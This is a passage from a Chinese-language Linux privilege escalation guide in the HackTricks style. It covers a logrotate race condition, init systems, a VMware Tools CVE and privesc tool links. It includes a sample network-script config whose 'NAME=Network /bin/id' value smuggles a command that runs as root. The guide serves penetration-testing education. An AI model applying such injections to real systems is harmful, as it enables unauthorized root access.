`logrotate` 中的一个漏洞允许对日志文件或其父目录具有 **写权限** 的用户可能获取提权。这是因为 `logrotate` 通常以 **root** 身份运行，可被操控去执行任意文件，尤其是在像 _**/etc/bash_completion.d/**_ 这样的目录中。重要的是不仅要检查 _/var/log_ 中的权限，还要检查任何应用了日志轮转的目录。

> [!TIP]
> 此漏洞影响 `logrotate` 版本 `3.18.0` 及更早版本

更多关于该漏洞的详细信息见此页面： [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

你可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 来利用此漏洞。

此漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** 非常相似，所以每当你发现可以修改日志时，检查是谁在管理那些日志，并检查是否可以通过将日志替换为符号链接来提权。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

如果由于某种原因，用户能够向 _/etc/sysconfig/network-scripts_ 写入一个 `ifcf-<whatever>` 脚本，**或** 能 **修改** 现有脚本，那么你的 **系统被 pwned**。

Network scripts，例如 _ifcg-eth0_，用于网络连接。它们看起来完全像 .INI 文件。然而，它们在 Linux 上被 Network Manager (dispatcher.d) ~sourced~ 。

在我的案例中，这些 network scripts 中的 `NAME=` 属性没有被正确处理。如果名字中有 **white/blank space in the name the system tries to execute the part after the white/blank space**。这意味着 **everything after the first blank space is executed as root**。

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_注意 Network 与 /bin/id 之间的空格_)

### **init, init.d, systemd, and rc.d**

目录 `/etc/init.d` 存放 System V init (SysVinit) 的 **scripts**，也就是 **经典的 Linux 服务管理系统** 的脚本。它包含用于 `start`、`stop`、`restart`，有时还有 `reload` 服务的脚本。这些脚本可以直接执行，或通过位于 `/etc/rc?.d/` 的符号链接来调用。在 Redhat 系统中，替代路径是 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关，Upstart 是 Ubuntu 引入的较新的 **service management**，使用配置文件来管理服务。尽管已向 Upstart 迁移，但由于 Upstart 的兼容层，仍然会同时使用 SysVinit 脚本和 Upstart 配置。

**systemd** 作为现代的初始化与服务管理器出现，提供了诸如按需启动 daemon、automount 管理以及系统状态快照等高级功能。它将文件组织在 `/usr/lib/systemd/`（用于发行版软件包）和 `/etc/systemd/system/`（用于管理员修改）中，从而简化系统管理流程。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks 通常会 hook 一个 syscall，将有权限的内核功能暴露给 userspace 的 manager。若 manager 的认证较弱（例如基于 FD-order 的签名检查或糟糕的密码方案），本地应用可能冒充该 manager，从而在已被 root 的设备上 escalate 到 root。更多细节与利用方法见：

{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

基于 Regex 的 service discovery 在 VMware Tools/Aria Operations 中可以从进程命令行提取二进制路径并以特权上下文使用 -v 执行它。过于宽松的 pattern（例如使用 \S）可能会匹配到攻击者放置在可写位置（例如 /tmp/httpd）的 listener，从而导致以 root 权限执行（CWE-426 Untrusted Search Path）。

了解更多并查看适用于其他 discovery/monitoring stacks 的通用模式：

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **查找 Linux 本地 privilege escalation 向量的最佳工具：** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
